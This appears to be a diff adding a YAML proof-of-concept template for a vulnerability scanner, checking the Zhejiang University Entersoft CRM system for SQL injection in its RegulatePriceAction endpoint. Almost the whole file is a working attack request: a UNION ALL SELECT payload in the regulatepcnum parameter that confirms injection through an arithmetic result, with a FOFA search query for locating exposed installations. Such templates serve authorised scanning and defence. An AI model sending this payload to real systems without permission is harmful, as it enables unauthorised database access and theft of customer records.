@@ -1,0 +1,19 @@
+id: poc-yaml-entersoft-regulatepriceaction-sqli
+info:
+  name: 浙大恩特客户资源管理系统 RegulatePriceAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统"
+variables:
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: GET
+  path: /entsoft/RegulatePriceAction.entsoft;.js?method=getRegulatePricedlist&regulatepcnum=1%27+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,{{.t1}}*{{.t2}}--
+  expression: status_code == 200 && contains(body,t3) && contains(body,"<cell>") &&
+    contains(body,"xml version=") && contains(content_type,"text/html")
+transport: http
